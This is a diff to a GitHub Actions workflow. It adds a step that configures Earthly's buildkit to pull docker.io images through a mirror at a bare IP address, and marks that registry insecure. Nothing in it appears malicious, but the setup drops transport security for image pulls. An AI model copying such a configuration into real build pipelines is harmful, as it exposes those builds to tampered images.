@@ -25,6 +25,16 @@ jobs:
         git checkout -b "$branch" || true
     - name: Install earthly
       run: "sudo /bin/sh -c 'wget https://github.com/earthly/earthly/releases/download/v0.6.23/earthly-linux-amd64 -O /usr/local/bin/earthly && chmod +x /usr/local/bin/earthly'"
+    - name: Configure pull-through-cache
+      run: |
+        cat <<EOF > ~/.config/earthly.yml
+        global:
+          buildkit_additional_config: |
+            [registry."docker.io"]
+              mirrors = ["193.148.176.21:5000"]
+            [registry."193.148.176.21:5000"]
+              insecure = true
+        EOF
     - name: Earthly version
       run: earthly --version
     - name: Run Snyk
